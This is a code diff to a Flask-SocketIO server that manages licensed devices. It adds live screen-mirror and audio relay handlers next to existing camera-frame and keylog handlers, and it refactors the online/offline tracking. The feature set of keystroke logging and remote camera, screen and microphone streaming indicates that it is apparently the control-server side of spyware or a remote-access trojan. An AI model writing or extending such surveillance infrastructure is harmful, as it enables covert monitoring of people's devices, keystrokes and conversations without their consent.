@@ -6,7 +6,9 @@ from flask_socketio import emit, join_room
 from core.auth import has_device_access
 from core.database import (
     database, users_database, connected_devices, sid_to_device,
-    connected_device_licenses, save_db, save_users_db
+    connected_device_licenses, save_db, save_users_db,
+    set_device_online, set_device_offline, is_device_online,
+    get_device_sid, cache_telemetry, get_cached_telemetry
 )
 from core.parsers import update_device_record
 
@@ -144,13 +146,10 @@ def register_socket_events(socketio):
         
         if device_id:
             join_room(device_id)
-            connected_devices[device_id] = request.sid
-            sid_to_device[request.sid] = device_id
+            set_device_online(device_id, request.sid, license_key)
             
             if license_key:
                 license_key = license_key.strip()
-                connected_device_licenses[device_id] = license_key
-                
                 if device_id not in database:
                     database[device_id] = {"_id": device_id}
                 database[device_id]["license_key"] = license_key
@@ -183,10 +182,8 @@ def register_socket_events(socketio):
 
     @socketio.on('disconnect')
     def handle_disconnect():
-        device_id = sid_to_device.pop(request.sid, None)
+        device_id = set_device_offline(request.sid)
         if device_id:
-            connected_devices.pop(device_id, None)
-            connected_device_licenses.pop(device_id, None)
             print(f"[Socket.io] Device disconnected: {device_id}")
             update_device_record(device_id, "logs", "Device Disconnected")
             socketio.emit('device_status_change', {'device_id': device_id, 'online': False})
@@ -233,6 +230,19 @@ def register_socket_events(socketio):
         device_id = sid_to_device.get(request.sid)
         if device_id:
             emit('camera_frame_relay', data, room=device_id, include_self=False)
+
+    @socketio.on('screen_frame')
+    @socketio.on('mirror_frame')
+    def handle_screen_frame(data):
+        device_id = sid_to_device.get(request.sid)
+        if device_id:
+            emit('mirror_frame_relay', data, room=device_id, include_self=False)
+
+    @socketio.on('audio_frame')
+    def handle_audio_frame(data):
+        device_id = sid_to_device.get(request.sid)
+        if device_id:
+            emit('live_audio_relay', data, room=device_id, include_self=False)
 
     @socketio.on('keylogs')
     def handle_keylogs(data):
